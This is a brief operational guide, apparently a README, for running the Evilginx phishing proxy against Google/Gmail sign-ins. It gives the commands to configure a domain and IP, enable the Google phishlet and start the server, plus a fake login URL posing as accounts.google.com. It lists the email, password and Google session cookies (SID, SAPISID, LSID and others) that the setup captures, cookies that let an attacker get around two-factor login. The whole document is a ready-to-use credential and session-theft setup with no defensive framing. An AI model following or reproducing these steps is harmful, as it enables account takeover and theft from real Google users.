# Evilginx Guide for Google/Gmail

## Enable and Launch

```bash
./bin/evilginx -p ./phishlets

# In shell:
config domain your-domain.com
config ip YOUR_IP
phishlets enable google
landers create google
server
```

## Credentials Captured

| Field | Key |
|-------|-----|
| Email | `identifier` |
| Password | `password` |

## Tokens Captured

- `SID` - Session ID
- `HSID` - HSID token
- `SAPISID` - SAPISID token
- `SSID` - SSID token
- `APISID` - API session
- `GAPS` - GAPS token
- `LSID` - LSID token
- `ACCOUNT_CHOOSER` - Account chooser

## Login URL

```
https://your-domain.com/google/ServiceLogin
```

Redirects from: accounts.google.com/ServiceLogin

---

**VANTABLACK**
